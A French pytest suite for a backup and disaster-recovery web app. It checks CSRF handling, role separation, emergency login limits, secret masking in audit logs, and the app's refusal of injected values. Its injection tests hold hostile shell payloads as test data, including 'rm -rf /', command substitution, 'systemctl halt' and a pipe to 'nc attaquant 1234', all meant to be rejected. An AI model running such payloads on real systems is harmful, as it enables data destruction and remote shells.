"""Parcours de la webapp et, surtout, sa résistance à l'injection.

Le fichier produit est lu par des scripts root : une valeur qui passerait la
webapp ET le helper serait une exécution de code en root. C'est le test qui
compte le plus ici.
"""
from __future__ import annotations

import re

import pytest


def _jeton(client, chemin="/reglages"):
    """Récupère le jeton anti-CSRF du formulaire, comme le ferait un navigateur."""
    m = re.search(r'name="_csrf" value="([^"]+)"', client.get(chemin).text)
    assert m, f"aucun jeton dans {chemin}"
    return m.group(1)


def test_tableau_de_bord(client):
    r = client.get("/")
    assert r.status_code == 200
    assert "tat de l" in r.text  # apostrophe échappée par Jinja
    # Le verdict « partiel » du volet Docker doit remonter dans « À traiter » :
    # un tableau de bord qui n'affiche que le bon côté ne sert à rien.
    assert "partiel" in r.text
    assert "Aucun canari configuré" in r.text


def test_reglages_affiches(client):
    r = client.get("/reglages")
    assert r.status_code == 200
    for attendu in ("Machines témoins", "Canaris", "PRA_QUORUM_MIN", "conf_ldap"):
        assert attendu in r.text


def test_enregistrement_valide(client):
    r = client.post("/reglages", data={"_csrf": _jeton(client, "/reglages"), 
        "PRA_WITNESSES": "192.0.2.20\n192.0.2.21",
        "PRA_QUORUM_MIN": "2",
        "PRA_ANOMALY_ACTION": "bloquer",
        "PRA_SIZE_DELTA_MAX": "40",
        "PRA_KEEP_MIN": "5",
        "PRA_RETENTION_DAYS": "30",
        "PRA_LOG_KEEP_DAYS": "90",
        "PRA_CANARY_PATHS": "/srv/Doc.docx",
        "PRA_CANARY_MANIFEST": "/etc/pra/canaries.list",
        "PRA_SYSTEM_PARTS": ["conf_ldap"],
    }, follow_redirects=True)
    assert r.status_code == 200
    assert "Configuration enregistrée" in r.text
    # Relecture : la valeur doit être revenue du helper.
    assert "192.0.2.20" in client.get("/reglages").text


@pytest.mark.parametrize("charge_utile", [
    'a"; rm -rf / #',
    "a$(id)",
    "a`id`",
    "a; systemctl halt",
    "a | nc attaquant 1234",
    "a\nPRA_KEEP_MIN=0",
])
def test_injection_shell_refusee(client, charge_utile):
    """Aucune de ces valeurs ne doit atteindre le fichier de configuration."""
    r = client.post("/reglages", data={"_csrf": _jeton(client, "/reglages"), 
        "PRA_WITNESSES": charge_utile,
        "PRA_ANOMALY_ACTION": "bloquer",
    }, follow_redirects=True)
    assert r.status_code == 200
    # Jinja échappe les apostrophes : on compare sur du texte sans apostrophe.
    assert "caractère interdit" in r.text or "est pas un nom d" in r.text
    assert "Configuration enregistrée" not in r.text


def test_quorum_incoherent_refuse(client):
    r = client.post("/reglages", data={"_csrf": _jeton(client, "/reglages"), 
        "PRA_WITNESSES": "a.fr b.fr",
        "PRA_QUORUM_MIN": "9",
        "PRA_ANOMALY_ACTION": "bloquer",
    }, follow_redirects=True)
    assert "dépasse le nombre de témoins" in r.text


def test_partie_systeme_hors_liste_refusee(client):
    """Ces valeurs deviennent des arguments de « yunohost backup restore »."""
    r = client.post("/reglages", data={"_csrf": _jeton(client, "/reglages"), 
        "PRA_WITNESSES": "a.fr",
        "PRA_ANOMALY_ACTION": "bloquer",
        "PRA_SYSTEM_PARTS": ["conf_ldap", "conf_inventee"],
    }, follow_redirects=True)
    assert "partie système inconnue" in r.text


def test_liste_collee_sur_plusieurs_lignes_acceptee(client_production):
    """Un <textarea> envoie ses sauts de ligne en CRLF : le « \r » ne doit pas
    faire échouer la saisie : une liste de canaris collée depuis un document
    serait refusée pour « caractère interdit »."""
    r = client_production.post("/reglages", data={"_csrf": _jeton(client_production, "/reglages"),
        "PRA_ANOMALY_ACTION": "bloquer",
        "PRA_CANARY_PATHS": "/srv/Doc.docx\r\n/opt/Proc.pdf\r\n/home/alex/Notes.docx",
    }, follow_redirects=True)
    assert "caractère interdit" not in r.text
    # La valeur doit être ENREGISTRÉE normalisée, pas seulement acceptée. Le
    # gabarit réaffiche une liste à raison d'une entrée par ligne.
    page = client_production.get("/reglages").text
    assert "/srv/Doc.docx\n/opt/Proc.pdf\n/home/alex/Notes.docx" in page


def test_injection_dans_une_liste_toujours_refusee(client_production):
    """La tolérance aux sauts de ligne ne doit pas ouvrir la porte au shell."""
    r = client_production.post("/reglages", data={"_csrf": _jeton(client_production, "/reglages"),
        "PRA_ANOMALY_ACTION": "bloquer",
        "PRA_CANARY_PATHS": "/srv/Doc.docx\r\n/opt/x.pdf; rm -rf /",
    }, follow_redirects=True)
    assert "caractère interdit" in r.text


def test_secret_masque_reste_considere_comme_present(client_production):
    """Un secret déjà enregistré revient masqué (●●●). Le retirer de la
    validation le faisait passer pour vide, et les alertes Talk étaient
    refusées alors qu'elles étaient réglées."""
    jeton = _jeton(client_production, "/reglages")
    r = client_production.post("/reglages", data={"_csrf": jeton,
        "PRA_ANOMALY_ACTION": "bloquer",
        "NC_TALK_URL": "https://nuage.exemple.fr",
        "NC_TALK_ROOM": "abc123",
        "NC_TALK_SECRET": "s3cret-du-bot",
    }, follow_redirects=True)
    assert "exigent les trois valeurs" not in r.text

    # Seconde soumission : le secret revient masqué, comme depuis un navigateur.
    r = client_production.post("/reglages", data={"_csrf": _jeton(client_production, "/reglages"),
        "PRA_ANOMALY_ACTION": "bloquer",
        "NC_TALK_URL": "https://nuage.exemple.fr",
        "NC_TALK_ROOM": "abc123",
        "NC_TALK_SECRET": "●●●●●●●●",
    }, follow_redirects=True)
    assert "exigent les trois valeurs" not in r.text


def test_talk_incomplet_toujours_refuse(client_production):
    """La tolérance au masquage ne doit pas laisser passer une configuration
    réellement incomplète — une alerte muette est pire qu'une absente."""
    r = client_production.post("/reglages", data={"_csrf": _jeton(client_production, "/reglages"),
        "PRA_ANOMALY_ACTION": "bloquer",
        "NC_TALK_URL": "https://nuage.exemple.fr",
        "NC_TALK_ROOM": "",
        "NC_TALK_SECRET": "",
    }, follow_redirects=True)
    assert "exigent les trois valeurs" in r.text


def test_audit_detaille_sans_divulguer_les_secrets(client_production):
    """Le journal doit dire CE QUI a changé — « réglages enregistrés » seul ne
    répond pas à la question qu'il sert. Et jamais la valeur d'un secret."""
    client_production.post("/reglages", data={"_csrf": _jeton(client_production, "/reglages"),
        "PRA_ANOMALY_ACTION": "bloquer",
        "PRA_CANARY_PATHS": "/srv/Doc.docx",
        "NC_TALK_URL": "https://nuage.exemple.fr",
        "NC_TALK_ROOM": "abc123",
        "NC_TALK_SECRET": "s3cret-tres-confidentiel",
    }, follow_redirects=True)
    trace = client_production.audit.read_text()
    assert "PRA_CANARY_PATHS" in trace and "/srv/Doc.docx" in trace
    assert "réglages enregistrés" in trace, "les accents doivent survivre"
    assert "s3cret-tres-confidentiel" not in trace, "un secret ne doit JAMAIS être tracé"
    assert "NC_TALK_SECRET" in trace, "mais sa modification doit être signalée"


def test_journal_colore_les_echecs(client):
    r = client.get("/journal/nightly")
    assert r.status_code == 200
    assert "l-erreur" in r.text and "l-attention" in r.text


def test_actions(client):
    j = _jeton(client)
    assert "intact" in client.post("/actions/canaris/verifier",
                                   data={"_csrf": j},
                                   follow_redirects=True).text
    assert "Alerte transmise" in client.post("/actions/tester-alerte",
                                             data={"_csrf": j},
                                             follow_redirects=True).text
    r = client.post("/actions/restaurer", data={"_csrf": _jeton(client, "/reglages"), "mode": "valider"},
                    follow_redirects=True)
    assert "Restauration en validation lancée" in r.text


# ── Accès de secours ────────────────────────────────────────────────────────
# Ce chemin contourne l'OIDC par conception : il doit rester joignable quand dex
# est mort, ET être borné pour ne pas devenir une porte ouverte.


def test_secours_joignable_sans_session(client_password):
    r = client_password.get("/login-secours")
    assert r.status_code == 200
    assert "Accès de secours" in r.text


def test_secours_limite_les_tentatives(client_password):
    for _ in range(5):
        client_password.post("/login-secours", data={"_csrf": _jeton(client_password, "/login-secours"), "password": "faux"},
                             follow_redirects=True)
    r = client_password.post("/login-secours", data={"_csrf": _jeton(client_password, "/login-secours"), "password": "faux"},
                             follow_redirects=True)
    assert "Trop de tentatives" in r.text


def test_secours_accepte_le_bon_mot_de_passe(client_password):
    r = client_password.post("/login-secours", data={"_csrf": _jeton(client_password, "/login-secours"), "password": "sesame-de-test"},
                             follow_redirects=True)
    assert r.status_code == 200
    assert "tat de l" in r.text  # apostrophe échappée par Jinja


def test_page_protegee_redirige_vers_login(client_password):
    r = client_password.get("/reglages", follow_redirects=False)
    assert r.status_code == 303
    assert r.headers["location"].endswith("/login")


# ── Rôle « production » ─────────────────────────────────────────────────────
# Un seul code, deux installations. Ce qui compte : chaque rôle ne montre que ce
# qui le concerne, et les actions de l'autre volet sont refusées côté serveur —
# masquer un bouton n'est pas une protection.


def test_production_masque_les_reglages_de_larche(client_production):
    """Chaque rôle ne montre que ce qui a un effet chez lui.

    Les canaris font exception : la production CRÉE les fichiers, l'arche
    VÉRIFIE leurs empreintes. La liste est donc modifiable des deux côtés —
    sinon le bouton « Déployer » de la production serait inopérant et les deux
    configurations divergeraient sans recours.
    """
    r = client_production.get("/reglages")
    assert r.status_code == 200
    assert "Applications écartées" in r.text          # propre à la production
    assert "Emplacements des canaris" in r.text       # commun aux deux
    assert "Machines témoins" not in r.text           # propre à l'arche
    assert "Absences tolérées" not in r.text          # la décision est à l'arche
    assert "Fichier manifeste" not in r.text


def test_production_propose_la_sauvegarde_pas_la_restauration(client_production):
    r = client_production.get("/")
    assert "Sauvegarder maintenant" in r.text
    assert "Restaurer maintenant" not in r.text


def test_production_refuse_la_restauration_cote_serveur(client_production):
    """Le bouton est absent, mais la route doit refuser d'elle-même."""
    j = _jeton(client_production, "/")
    r = client_production.post("/actions/restaurer",
                               data={"mode": "reel", "_csrf": j},
                               follow_redirects=True)
    assert "Restauration en validation lancée" not in r.text
    assert "possible que depuis l" in r.text


def test_arche_refuse_la_sauvegarde_cote_serveur(client):
    j = _jeton(client, "/")
    r = client.post("/actions/sauvegarder", data={"_csrf": j},
                    follow_redirects=True)
    assert "Sauvegarde lancée" not in r.text
    assert "existe que sur la production" in r.text


# ── Sélection réelle des applications, et traçabilité ───────────────────────


def test_les_applications_installees_sont_proposees(client_production):
    """Une liste saisie à la main se périme en silence : elle doit venir de la
    machine, pas d'un champ libre."""
    r = client_production.get("/reglages")
    for attendu in ("Nextcloud", "Vaultwarden", "CyberChef",
                    'value="cyberchef"'):
        assert attendu in r.text


def test_les_actions_sont_tracees(client):
    """Sans trace, « qui a lancé quoi » est indéterminable après coup."""
    client.post("/actions/tester-alerte", data={"_csrf": _jeton(client)},
                follow_redirects=True)
    assert client.audit.exists(), "aucune trace écrite"
    assert "alerte d" in client.audit.read_text()


def test_la_restauration_reelle_est_tracee_avec_son_mode(client):
    client.post("/actions/restaurer",
                data={"mode": "reel", "_csrf": _jeton(client, "/")},
                follow_redirects=True)
    contenu = client.audit.read_text()
    assert "restauration" in contenu and "réelle" in contenu


# ── URI de redirection OIDC ─────────────────────────────────────────────────
# Elle doit correspondre AU CARACTÈRE PRÈS à celle déclarée dans dex. Un préfixe
# de sous-chemin oublié donne « unregistered redirect_uri » — une erreur qui ne
# se voit que du côté du fournisseur d'identité, jamais de l'application.


def test_uri_de_retour_porte_le_prefixe(monkeypatch):
    import sys
    for m in [m for m in list(sys.modules) if m.startswith("app")]:
        del sys.modules[m]
    monkeypatch.setenv("ARCHE_ROOT_PATH", "/arche")
    monkeypatch.setenv("ARCHE_SESSION_SECRET", "essai")
    from app.config import get_settings
    get_settings.cache_clear()
    from app.main import _uri_retour

    class FausseRequete:
        base_url = "https://exemple.org/"

    assert _uri_retour(FausseRequete()) == \
        "https://exemple.org/arche/auth/retour"


def test_uri_de_retour_respecte_l_url_publique(monkeypatch):
    import sys
    for m in [m for m in list(sys.modules) if m.startswith("app")]:
        del sys.modules[m]
    monkeypatch.setenv("ARCHE_ROOT_PATH", "/arche")
    monkeypatch.setenv("ARCHE_PUBLIC_URL", "https://autre.example.fr/arche/")
    monkeypatch.setenv("ARCHE_SESSION_SECRET", "essai")
    from app.config import get_settings
    get_settings.cache_clear()
    from app.main import _uri_retour

    class FausseRequete:
        base_url = "http://127.0.0.1:8770/"

    # L'URL publique déclarée doit primer sur ce que dit la requête : derrière un
    # reverse-proxy, celle-ci peut annoncer http et le mauvais hôte.
    assert _uri_retour(FausseRequete()) == \
        "https://autre.example.fr/arche/auth/retour"


# ── Sélection des cibles de restauration ────────────────────────────────────
# La liste vient de l'inventaire de la VEILLE. Le point délicat est le sens du
# vide : rien de coché doit signifier « tout restaurer », et non « rien ».


def test_les_cibles_de_la_veille_sont_proposees(client):
    r = client.get("/reglages")
    assert "Ce qui est restauré" in r.text
    for attendu in ('value="nextcloud"', 'value="vaultwarden"',
                    'value="notes"', 'value="wiki"'):
        assert attendu in r.text
    # L'horodatage de l'inventaire doit être affiché : sans lui, l'utilisateur
    # ne sait pas sur quoi porte sa sélection.
    assert "2026-07-28 à 02:15" in r.text


def test_aucune_selection_signifie_tout_restaurer(client):
    r = client.get("/reglages")
    assert "tout est restauré" in r.text
    # Et les cases sont alors toutes cochées, pour que l'écran dise la vérité.
    assert r.text.count('checked') >= 5


def test_une_selection_vide_reste_vide_en_configuration(client):
    """Ne rien cocher ne doit pas écrire une liste bidon : le vide est une
    valeur porteuse de sens ici — « toutes »."""
    r = client.post("/reglages", data={
        "_csrf": _jeton(client), "PRA_WITNESSES": "192.0.2.20",
        "PRA_ANOMALY_ACTION": "bloquer",
    }, follow_redirects=True)
    assert "Configuration enregistrée" in r.text


def test_la_retention_gfs_est_reglable(client):
    r = client.get("/reglages")
    for attendu in ("Jours conservés", "Lundis conservés",
                    "Premiers du mois conservés",
                    "Supprimer réellement les archives"):
        assert attendu in r.text



def test_un_reglage_absent_n_est_pas_inventé():
    """Ne pas écrire de valeur par défaut pour un réglage non soumis.

    Sinon chaque machine accumule les réglages de l'AUTRE rôle, figés à la date
    d'écriture, invisibles dans son interface et impossibles à corriger. C'est
    ce qui a laissé la production avec une liste de canaris périmée.
    """
    from app.praconf import valider
    v = valider({"PRA_WITNESSES": "a.fr", "PRA_ANOMALY_ACTION": "bloquer"})
    assert set(v) == {"PRA_WITNESSES", "PRA_ANOMALY_ACTION"}
    assert "PRA_CANARY_PATHS" not in v


def test_suspension_offre_un_selecteur_et_des_prereglages(client):
    """La suspension se saisit au sélecteur du navigateur, pas à la main : une
    date mal formée serait refusée par le script nocturne, donc silencieusement
    sans effet — le pire des cas pour un réglage de sécurité."""
    page = client.get("/reglages").text
    assert 'type="datetime-local"' in page
    assert 'name="PRA_PAUSE_JUSQUA"' in page
    # Les quatre durées, et la reprise immédiate.
    for h in ("4", "12", "24", "72"):
        assert f'data-heures="{h}"' in page
    assert 'data-heures="0"' in page


def test_prereglages_caches_sans_script(client):
    """Sans JavaScript, les boutons ne doivent pas s'afficher : ils seraient
    inertes, et le sélecteur du navigateur suffit."""
    import re as _re
    page = client.get("/reglages").text
    m = _re.search(r'<div class="prereglages"[^>]*>', page)
    assert m and "hidden" in m.group(0)


def test_page_depot_montre_le_stockage(client):
    """La place occupée est l'information qu'on vient chercher : sans elle, on
    ne sait pas si l'on peut encore ajouter une image de 15 Go."""
    page = client.get("/depot").text
    assert "Dépôt de secours" in page
    assert "24,1 Go" in page and "27,4 Go" in page     # images, puis total
    assert "598,0 Go" in page                          # place restante


def test_page_depot_ne_propose_pas_de_televersement(client):
    """Le dépôt de fichiers s'en charge : le refaire ici coûterait cher pour
    rien, et l'interface ne doit pas le laisser croire."""
    page = client.get("/depot").text
    assert 'type="file"' not in page
    assert "dépôt de fichiers" in page


def test_verification_du_depot(client):
    jeton = _jeton(client, "/depot")
    r = client.post("/depot/verifier", data={"_csrf": jeton}, follow_redirects=True)
    assert r.status_code == 200
    assert "Ubuntu Server 24.04 LTS" in r.text     # nouvelle version
    assert "Fedora Server" in r.text               # absent


def test_action_inconnue_refusee(client):
    """La valeur vient de l'URL : elle ne doit jamais servir à construire une
    commande, seulement à choisir dans une liste blanche."""
    jeton = _jeton(client, "/depot")
    r = client.post("/depot/rm-rf", data={"_csrf": jeton}, follow_redirects=True)
    assert r.status_code == 200
    assert "Action inconnue" in r.text


def test_page_depot_montre_le_stockage(client):
    """La place occupée est l'information qu'on vient chercher : sans elle, on ne
    sait pas si l'on peut encore ajouter une image de 15 Go."""
    page = client.get("/depot").text
    assert "Dépôt de secours" in page
    assert "24,1 Go" in page and "27,4 Go" in page     # images, puis total
    assert "598,0 Go" in page                          # place restante


def test_page_depot_ne_propose_pas_de_televersement(client):
    """Le dépôt de fichiers s'en charge déjà : le refaire ici coûterait cher pour
    rien, et l'interface ne doit pas laisser croire qu'on peut y déposer."""
    page = client.get("/depot").text
    assert 'type="file"' not in page
    assert "dépôt de fichiers" in page


def test_verification_du_depot(client):
    jeton = _jeton(client, "/depot")
    r = client.post("/depot/verifier", data={"_csrf": jeton}, follow_redirects=True)
    assert r.status_code == 200
    assert "Ubuntu Server 24.04 LTS" in r.text     # nouvelle version disponible
    assert "Fedora Server" in r.text               # absent du dépôt


def test_action_de_depot_inconnue_refusee(client):
    """L'action vient de l'URL : elle ne sert jamais à construire une commande,
    seulement à choisir dans une liste blanche."""
    jeton = _jeton(client, "/depot")
    r = client.post("/depot/rm-rf", data={"_csrf": jeton}, follow_redirects=True)
    assert r.status_code == 200
    assert "Action inconnue" in r.text


def test_depot_absent_de_la_production(client_production):
    """La production n'a pas de dépôt de secours à entretenir."""
    assert "/depot" not in client_production.get("/").text


def test_boutons_du_depot_neutralises_a_l_envoi(client):
    """Un double clic lançait deux requêtes : le verrou du helper en écartait
    une, mais l'utilisateur recevait un refus alarmant pour une action qu'il
    venait de réussir."""
    page = client.get("/depot").text
    assert "disabled = true" in page.replace("b.disabled = true", "disabled = true")
    assert "En cours…" in page


def test_options_de_restauration_transmises(client):
    """Les trois options doivent atteindre le helper, et le message doit les
    rappeler : découvrir après coup que la machine allait s'éteindre serait la
    pire des surprises."""
    jeton = _jeton(client, "/")
    r = client.post("/actions/restaurer",
                    data={"mode": "reel", "_csrf": jeton, "halt": "1",
                          "sans_transfert": "1"},
                    follow_redirects=True)
    # L'apostrophe est échappée par Jinja : on vise la partie qui ne l'est pas.
    assert "teindra à la fin" in r.text
    assert "archive locale, sans transfert" in r.text


def test_extinction_ignoree_en_validation(client):
    """On valide pour EXAMINER le résultat : une extinction viderait l'exercice
    de son sens. L'option est donc écartée plutôt qu'obéie."""
    jeton = _jeton(client, "/")
    r = client.post("/actions/restaurer",
                    data={"mode": "valider", "_csrf": jeton, "halt": "1"},
                    follow_redirects=True)
    assert "Restauration en validation lancée" in r.text
    assert "éteindra" not in r.text


def test_formulaire_offre_les_trois_options(client):
    page = client.get("/").text
    for champ in ("halt", "sans_transfert", "sans_controles"):
        assert f'name="{champ}"' in page


def test_restauration_inclut_les_piles_docker_par_defaut(client):
    """Le défaut le plus sournois qu'on ait corrigé : « Restaurer maintenant »
    ne traitait QUE les applications YunoHost. L'arche repartait avec Nextcloud
    à jour et wiki datant de la veille, sans que rien ne le signale."""
    jeton = _jeton(client, "/")
    r = client.post("/actions/restaurer", data={"mode": "reel", "_csrf": jeton},
                    follow_redirects=True)
    assert "piles Docker comprises" in r.text


def test_on_peut_restaurer_sans_les_piles(client):
    jeton = _jeton(client, "/")
    r = client.post("/actions/restaurer",
                    data={"mode": "reel", "_csrf": jeton, "sans_docker": "1"},
                    follow_redirects=True)
    assert "SANS les piles Docker" in r.text


def test_validation_ne_touche_pas_aux_piles(client):
    """Une validation ne modifie rien : enchaîner le volet Docker y serait une
    contradiction."""
    jeton = _jeton(client, "/")
    r = client.post("/actions/restaurer", data={"mode": "valider", "_csrf": jeton},
                    follow_redirects=True)
    assert "SANS les piles Docker" in r.text


def test_sauvegarde_de_production_offre_deux_boutons(client_production):
    """DEUX BOUTONS, pas une case. Une case garde un état que le navigateur
    restaure au rechargement — « autocomplete=off » n'y suffit pas sous Firefox —
    et sur une option qui désactive une protection, une case restée cochée
    ferait sauter l'instantané Docker en silence. Un bouton ne garde rien."""
    page = client_production.get("/").text
    assert "Sauvegarder maintenant" in page
    assert "Sans l'instantané Docker" in page
    # Aucune case sur ce bloc : l'option passe par un champ caché.
    assert 'type="checkbox" name="sans_docker"' not in page
    assert 'type="hidden" name="sans_docker"' in page


def test_sauvegarde_inclut_docker_par_defaut(client_production):
    jeton = _jeton(client_production, "/")
    r = client_production.post("/actions/sauvegarder", data={"_csrf": jeton},
                               follow_redirects=True)
    assert "instantané Docker compris" in r.text


def test_feuille_de_style_versionnee(client):
    """Sans version dans l'URL, le navigateur sert l'ancienne feuille après un
    déploiement — et l'on croit à un défaut du code alors que le serveur rend
    déjà le bon fichier."""
    import re as _re
    page = client.get("/").text
    m = _re.search(r'style\.css\?v=(\d+)', page)
    assert m, "la feuille de style n'est pas versionnée"
    assert int(m.group(1)) > 0


def test_cases_d_options_non_restaurees_par_le_navigateur(client, client_production):
    """Le navigateur restaure l'état des cases au rechargement. Sur des options
    qui DÉSACTIVENT une protection, on croirait repartir d'un formulaire vierge
    alors qu'une case resterait cochée depuis la fois précédente."""
    import re as _re
    for c in (client, client_production):
        page = c.get("/").text
        for champ in _re.findall(r'<input type="checkbox" name="(\w+)"[^>]*>', page):
            m = _re.search(r'<input type="checkbox" name="%s"[^>]*>' % champ, page)
            assert 'autocomplete="off"' in m.group(0), champ
            assert "checked" not in m.group(0), champ


def test_confirmation_enumere_toutes_les_options(client):
    """Quatre options ne se ramènent pas à des boutons : la confirmation est donc
    le garde-fou de ce bloc. Elle doit les énumérer TOUTES — le navigateur peut
    avoir restauré une case, et une option subie passerait sinon inaperçue."""
    page = client.get("/").text
    for champ in ("sans_controles", "sans_docker", "sans_transfert", "halt"):
        assert f"[name={champ}]" in page, champ


def test_les_options_disent_le_sens_de_la_coche(client):
    """« à ne décocher qu'en sachant pourquoi » disait l'inverse de ce qu'il
    fallait faire : on COCHE pour ignorer les contrôles. Une consigne inversée
    sur l'option la plus dangereuse du dispositif."""
    page = client.get("/").text
    assert "ne cocher qu'en sachant pourquoi" in page
    assert "ne décocher qu'en sachant pourquoi" not in page
    assert "ce qui se passera si vous la cochez" in page


def test_page_depot_mene_au_site_des_manuels(client):
    """Le dépôt de fichiers rend les pages une par une : les liens entre elles
    n'y fonctionnent pas, et un miroir dont les liens sont morts ne vaut rien.
    Les manuels sont donc servis comme un site, sur le port de secours."""
    page = client.get("/depot").text
    assert "8080/manuels/" in page
    assert "les liens entre elles n'y" in page
